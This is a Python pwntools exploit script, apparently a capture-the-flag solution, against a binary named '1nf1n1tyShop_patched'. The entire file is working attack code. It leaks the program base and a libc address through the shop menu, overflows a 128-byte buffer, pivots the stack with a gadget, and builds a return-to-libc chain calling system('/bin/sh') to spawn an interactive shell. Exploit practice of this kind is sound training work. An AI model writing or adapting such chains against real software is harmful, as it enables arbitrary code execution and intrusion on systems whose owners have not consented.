#!/usr/bin/env python3

from pwn import *

exe =context.binary = ELF("./1nf1n1tyShop_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux.so.2")

io = process()


io.sendlineafter(b'>', b'traveller')
io.sendlineafter(b'>', b'4')
exe.address = int(io.recvuntil(b'>').lstrip(b'You prize: ')[:10], 16) -  0x11ed  
print(f"Base address: {hex(exe.address)}")

ret = p32(exe.address+0x100a)
sub_esp_ret = pack(exe.address+0x1212)

main_len = pack(exe.sym.main)

payload = b'A'*128
payload += pack(exe.sym.main)
payload += b'B'*(44-len(main_len))
payload += sub_esp_ret

io.sendline(b'2')
io.sendafter(b'>', payload)
io.sendlineafter(b'>', b'hacker')
io.sendlineafter(b'>', b'4')
libc.address = int(io.recvuntil(b'>').lstrip(b'You prize: ')[:10], 16)-libc.sym.system
print(f"Libc address: {hex(libc.address)}")

io.sendline(b'2')
binsh  = next(libc.search(b"/bin/sh\x00"))
system = libc.sym.system

chain = pack(system) + b'B'*0x4 + pack(binsh)

payload = b"\x00" * 128 
payload += chain
payload += b"\x00" * (44 - len(chain))
payload += sub_esp_ret

io.sendafter(b'>', payload)

print("Here is your shell :)")

io.interactive()
